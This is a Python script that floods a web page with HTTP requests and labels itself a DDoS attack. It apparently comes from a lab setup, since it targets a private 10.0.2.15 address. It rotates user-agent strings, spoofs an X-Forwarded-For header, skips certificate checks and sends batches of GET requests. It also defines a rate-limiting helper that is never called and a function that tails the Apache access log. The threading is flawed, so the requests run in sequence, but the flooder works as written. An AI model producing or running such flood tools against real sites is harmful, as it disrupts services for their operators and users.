import requests
import threading
import subprocess
import random
import urllib3
from datetime import datetime, timedelta
import time

urllib3.disable_warnings()

# Fake IP address, but this doesn't make us anonymous
fake_ip = '192.168.1.100'

# Global variables to track rate limiting
last_request_time = datetime.min
lock = threading.Lock()

user_agents = [
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
]

def show_logs():
    try:
        log_display = subprocess.check_output(['tail', '-n', '10', '/var/log/apache2/access.log'])
        log_display = log_display.decode('utf-8')
        print(log_display)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")


def rate_limiting():
    global last_request_time, lock

    print("Executing rate limiting (1 second between allowed requests)...")

    # Acquire lock to ensure thread safety
    with lock:
        current_time = datetime.now()
        time_since_last_request = current_time - last_request_time

        # Checks if the rate limit has been reached
        if time_since_last_request < timedelta(seconds=1):
            # Sleep to enforce rate limiting
            time.sleep((timedelta(seconds=1) - time_since_last_request).total_seconds())

        # Update last request time
        last_request_time = datetime.now()

def http_flood(target_url, num_of_requests):
    # Flood the webpage with requests
    for _ in range(num_of_requests):
        try:
            # Randomly select a user-agent string
            user_agent = random.choice(user_agents)

            # verify=False ensures that the SSL certificate verification for the HTTP requests is skipped
            # Send HTTP Get request with random user agent
            send_request = requests.get(target_url, headers={'User-Agent': user_agent, 'X-Forwarded-For': fake_ip},
                                        verify=False)
            print(f"Request status: {send_request.status_code}")
            print()
        except Exception as e:
            print(f"Error: {str(e)}")


if __name__ == "__main__":
    target_url = "https://10.0.2.15/real-estate-html-template/index.html"
    num_of_requests = 50

    print(f"Starting http flood, targeting {target_url}")

    # Creates and sends multiple threads synchronously
    threads = []
    for _ in range(5):
        thread = threading.Thread(target=http_flood(target_url, num_of_requests))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"DDoS attack finished.")
